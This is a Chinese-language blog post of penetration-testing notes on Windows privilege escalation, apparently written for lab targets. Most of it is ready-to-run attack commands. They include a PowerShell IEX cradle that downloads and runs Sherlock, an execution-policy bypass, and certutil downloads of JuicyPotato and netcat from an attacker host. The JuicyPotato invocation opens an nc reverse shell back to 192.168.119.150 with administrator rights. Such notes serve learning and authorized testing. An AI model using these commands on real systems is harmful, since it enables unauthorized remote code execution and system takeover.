---
title: Windows漏洞扫描与提权
date: 2021/12/12
tags: [windows,渗透测试,漏洞利用]
categories: 渗透测试
index_img: https://herozql.oss-cn-beijing.aliyuncs.com/bg_pic/bing_20.jpg
banner_img: https://herozql.oss-cn-beijing.aliyuncs.com/bg_pic/bing_20.jpg
---



# windows漏洞扫描与提权

## 漏洞扫描

- 使用msf

```
use post/multi/recon/local_exploit_suggester
```

- 脚本 [Sherlock](https://github.com/mxrmiss/Sherlock)
  - **[使用方法](https://vk9-sec.com/sherlock-find-missing-windows-patches-for-local-privilege-escalation/)**


>```
>初步使用本地加载脚本
>Import-Module Sherlock.ps1
>
>远程加载脚本
>IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1')
>
>在不触发脚本执行检测的情况下运行Sherlock
>powershell -ExecutionPolicy Bypass -File Sherlock.ps1
>```

>- 使用**Meterpreter**
>
>1. 加载powershell  
>
>```
>load powershell
>```
>
>![img](https://herozql.oss-cn-beijing.aliyuncs.com/main/word-image-30.png)
>
>2. 导入 Sherlock 脚本。找到包含它的文件夹 (第一次可能不成功，多试几次)
>
>```
>powershell_import ‘Sherlock.ps1’
>```
>
>![img](https://herozql.oss-cn-beijing.aliyuncs.com/main/word-image-31.png)
>
>3. 运行脚本 (第一次可能不成功，多试几次)
>
>```
>powershell_execute “Find-allvulns”
>```
>
>![img](https://herozql.oss-cn-beijing.aliyuncs.com/main/word-image-32.png)

- 脚本 [Watson](https://github.com/mxrmiss/Watson)



## 提权

- 脚本 [Chimichurri](https://github.com/mxrmiss/Chimichurri)

>- 在windows靶机中接收脚本文件
>
>```
>certutil -f -urlcache http://10.10.14.31:8000/chimichurri.exe chimichurri.exe
>```
>
>- 本地机器nc监听端口, 靶机上使用脚本文件
>
>```
>chimichurri.exe ip port
>```
>
>- 查看之前监听的端口(可能一次不一会成功，需要多试几次)

- 脚本 [juicyPotato.exe](https://github.com/ohpe/juicy-potato/releases)

>- 首先使用`whoami \priv` 查看用户权限，如果用户拥有`SeImpersonate`或`SeAssignPrimaryToken`权限，则这个脚本就适用
>- 上传到靶机
>
>```
>certutil -f -urlcache http://192.168.119.150:8000/JuicyPotato.exe juicyPotato.exe
>```
>
>- 上传nc.exe到靶机
>
>```
>certutil -f -urlcache http://192.168.119.150:8000/nc64.exe nc.exe
>```
>
>- 使用juicyPotato.exe
>
>```
>juicyPotato.exe  -l 5837 -t t -p C:\Windows\System32\cmd.exe   -a "/cc:\users\public\nc.exe -e cmd.exe 192.168.119.150 5555"
>```
>
>- 查看本地监听的端口，成功获取管理员权限
>
>